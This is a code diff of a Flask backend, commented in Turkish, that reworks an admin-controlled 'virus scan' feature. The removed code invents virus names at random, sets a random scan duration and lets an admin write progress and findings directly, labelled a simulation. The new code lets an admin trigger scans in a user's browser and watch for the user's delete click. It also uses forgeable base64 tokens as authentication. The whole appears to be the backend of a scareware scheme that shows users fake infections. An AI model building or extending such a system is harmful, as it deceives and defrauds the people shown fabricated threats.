@@ -314,94 +314,59 @@ def api_relay_location():
 
 
 # ==================== VIRUS SCAN ====================
+# Artık tarama kullanıcı tarafında (tarayıcıda) çalışır.
+# Admin sadece tetikler ve kullanıcının raporunu izler.
 
-VIRUS_PREFIXES = [
-    "Trojan.Win32.Generic", "Backdoor.Linux.Mirai", "Ransomware.Win32.Crypter",
-    "Worm.Python.Script", "Adware.Android.MobiDash", "Spyware.Win32.KeyLogger",
-    "Rootkit.Linux.HideProc", "Exploit.HTML.Phishing", "Trojan.JS.Agent",
-    "Backdoor.Win32.Orcus", "Worm.Python.Network", "Ransomware.Linux.Encoder",
-    "Adware.Win32.BundleBot", "Trojan.Python.Downloader", "Spyware.Android.CallLog",
-    "Rootkit.Win32.Bootkit", "Exploit.PHP.Shell", "Worm.JS.CoinMiner",
-]
-VIRUS_TYPES = [
-    "Banking", "DDoS", "KeyLogger", "ScreenCapture", "RAT", "CryptoMiner",
-    "InfoStealer", "ClipboardHijack", "CredentialDump", "RemoteShell",
-]
-
-def generate_virus_name():
-    prefix = random.choice(VIRUS_PREFIXES)
-    suffix = ''.join(random.choices('0123456789ABCDEF', k=8))
-    return f"{prefix}.{suffix}"
-
-def generate_virus_scan_id():
-    return ''.join(random.choices('0123456789abcdef', k=16))
+# Admin → kullanıcı tetikleme sinyali
+virus_scan_triggers = {}  # uid -> {"triggered": True, "triggered_at": time}
 
 
-@app.route("/api/admin/virus/start-scan/<uid>", methods=["POST"])
-def api_admin_virus_start_scan(uid):
-    """Admin virüs taraması başlatır."""
+# ==================== ADMIN VIRUS ENDPOINTS ====================
+
+@app.route("/api/admin/virus/trigger-scan/<uid>", methods=["POST"])
+def api_admin_virus_trigger_scan(uid):
+    """Admin tarama tetikler. Kullanıcı tarayıcısı poll ile algılar."""
     session = require_admin(request)
     if not session:
         return jsonify({"status": "error", "error": "Yetkisiz"}), 401
 
-    scan_id = generate_virus_scan_id()
-    findings = []
-
     with relay_lock:
-        virus_scans[uid] = {
-            "status": "scanning",
-            "findings": findings,
-            "progress": 0,
-            "scan_id": scan_id,
-            "cleaned": False,
-            "confirmed": False,
-            "started_at": time.time(),
-            "duration": random.randint(180, 270),  # 3-4.5 dk
+        virus_scan_triggers[uid] = {
+            "triggered": True,
+            "triggered_at": time.time()
         }
+        # Scan kaydını oluştur (kullanıcı tarafı doldurur)
+        if uid not in virus_scans:
+            virus_scans[uid] = {
+                "status": "pending",
+                "findings": [],
+                "progress": 0,
+                "cleaned": False,
+                "confirmed": False,
+            }
 
-    return jsonify({"status": "ok", "scan_id": scan_id})
+    return jsonify({"status": "ok"})
 
 
-@app.route("/api/admin/virus/progress/<uid>")
-def api_admin_virus_progress(uid):
-    """Admin tarama ilerlemesini sorgular."""
+@app.route("/api/admin/virus/check-status/<uid>")
+def api_admin_virus_check_status(uid):
+    """Admin tarama durumunu sorgular (progress, findings, delete_requested, confirmed)."""
     session = require_admin(request)
     if not session:
         return jsonify({"status": "error", "error": "Yetkisiz"}), 401
 
     with relay_lock:
         scan = virus_scans.get(uid)
+        trigger = virus_scan_triggers.get(uid)
 
     if not scan:
         return jsonify({"status": "pending", "message": "Tarama baslatilmadi"})
 
     return jsonify({
         "status": "ok",
-        "scan": scan
+        "scan": scan,
+        "trigger_active": trigger.get("triggered", False) if trigger else False
     })
-
-
-@app.route("/api/admin/virus/scan-update/<uid>", methods=["POST"])
-def api_admin_virus_scan_update(uid):
-    """Admin tarama durumunu günceller (simülasyon ilerlemesi)."""
-    session = require_admin(request)
-    if not session:
-        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
-
-    data = request.get_json() or {}
-    with relay_lock:
-        scan = virus_scans.get(uid)
-        if not scan:
-            return jsonify({"status": "error", "error": "Tarama bulunamadi"}), 404
-
-        if "progress" in data:
-            scan["progress"] = data["progress"]
-        if "findings" in data:
-            scan["findings"] = data["findings"]
-        if "status" in data:
-            scan["status"] = data["status"]
-
-    return jsonify({"status": "ok"})
 
 
 @app.route("/api/admin/virus/confirm-clean/<uid>", methods=["POST"])
@@ -424,26 +389,56 @@ def api_admin_virus_confirm_clean(uid):
     return jsonify({"status": "ok", "message": "Temizlik onaylandi"})
 
 
-@app.route("/api/admin/virus/check-delete-request/<uid>")
-def api_admin_virus_check_delete_request(uid):
-    """Kullanıcının sil butonuna basıp basmadığını kontrol et."""
-    session = require_admin(request)
-    if not session:
+# ==================== VIRUS RELAY (user <-> server) ====================
+
+@app.route("/api/relay/virus/check-trigger")
+def api_relay_virus_check_trigger():
+    """Kullanıcı tarayıcısı tarama tetikleyicisini kontrol eder."""
+    uid = request.args.get("uid", "")
+    auth_arg = request.args.get("auth", "")
+    try:
+        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
+        if auth_data.get("uid") != uid:
+            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+    except Exception:
+        return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+
+    with relay_lock:
+        trigger = virus_scan_triggers.get(uid)
+        if trigger and trigger.get("triggered"):
+            # Tetiği temizle (tek seferlik)
+            virus_scan_triggers[uid]["triggered"] = False
+            return jsonify({"status": "ok", "trigger": True})
+
+    return jsonify({"status": "ok", "trigger": False})
+
+
+@app.route("/api/relay/virus/scan-status", methods=["POST"])
+def api_relay_virus_scan_status():
+    """Kullanıcı tarama durumunu server'a bildirir."""
+    data = request.get_json() or {}
+    uid = data.get("uid", "")
+    auth_arg = data.get("auth", "")
+
+    try:
+        auth_data = json.loads(base64.b64decode(auth_arg.encode()).decode())
+        if auth_data.get("uid") != uid:
+            return jsonify({"status": "error", "error": "Yetkisiz"}), 401
+    except Exception:
         return jsonify({"status": "error", "error": "Yetkisiz"}), 401
 
     with relay_lock:
         scan = virus_scans.get(uid)
         if not scan:
-            return jsonify({"status": "pending"})
+            return jsonify({"status": "error", "error": "Tarama bulunamadi"}), 404
 
-    return jsonify({
-        "status": "ok",
-        "delete_requested": scan.get("delete_requested", False),
-        "scan": scan
-    })
+        scan["progress"] = data.get("progress", scan.get("progress", 0))
+        scan["status"] = data.get("status", scan.get("status", "scanning"))
+        if "findings" in data:
+            scan["findings"] = data["findings"]
 
+    return jsonify({"status": "ok"})
 
-# ==================== VIRUS RELAY (user -> server) ====================
 
 @app.route("/api/relay/virus/notify-delete", methods=["POST"])
 def api_relay_virus_notify_delete():
